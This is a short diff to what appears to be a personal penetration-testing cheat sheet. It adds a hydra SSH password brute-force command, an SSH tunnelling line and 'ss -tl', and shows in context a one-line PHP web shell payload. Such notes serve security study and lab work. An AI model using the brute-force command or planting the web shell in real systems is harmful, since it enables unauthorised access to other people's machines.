@@ -10,6 +10,12 @@
  
 ## Tools
 * wappalyzer(extension)
+* hydra, usernames.txt one row one username
+  ```hydra -L usernames.txt -p '{PASSWORD}' {target_IP} ssh```
+* SSH Tunnel
+  ```ssh -L 1234:localhost:22 {USER}@{IP}
+* Network traffic and process name
+  ```ss -tl```
 
 ## Nmap
   ```shell
@@ -158,7 +164,3 @@ echo 'kali:kali' | sudo chpasswd
 ## Injection
 ### PHP
   ```echo '<?php system($_GET["cmd"]); ?>' > shell.php```
-
-## Shells
-* Network traffic and process name
-  ```ss -tl```
